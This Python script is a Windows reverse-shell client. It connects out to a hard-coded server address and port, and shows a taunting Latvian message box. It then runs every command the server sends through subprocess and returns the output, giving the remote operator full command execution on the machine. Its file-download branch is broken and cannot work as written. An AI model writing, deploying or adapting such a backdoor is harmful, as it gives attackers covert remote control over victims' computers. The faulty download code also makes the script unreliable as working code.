import socket
import os
import subprocess
import sys
from win32gui import *
from win32con import *
SERVER_HOST = "192.168.204.1"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "\n"
output = ""
# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))
# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())
MessageBox(None, "Tu esi Ēzelis hahahahaha\n"\
    "Es asmu linus ;)", "Kļūda", MB_OK | MB_ICONERROR)
while True:
    output = ""
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    try:
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        for cmd in splited_command:
            if cmd.startswith("download"):
                if cmd.startswith("download "):
                    path = cmd[8:]
                    with open(path, "r") as file:
                        filedata = file.read(f"Contents of file [{path}]:\n{file.read()}")
                        output = ""
                else:
                    raise ValueError("Needs a file path to download idiot")
        if splited_command[0].lower() == "cd":
            # cd command, change directory
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                # if there is an error, set as the output
                output = str(e)
            else:
                # if operation is successful, empty message
                output = ""
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}"
        message = (message) + "\n"
    except BaseException as exce:
        message = output + "\n" + (str(exce)) + "\n"
        continue
    s.send(message.encode())

# close client connection
s.close()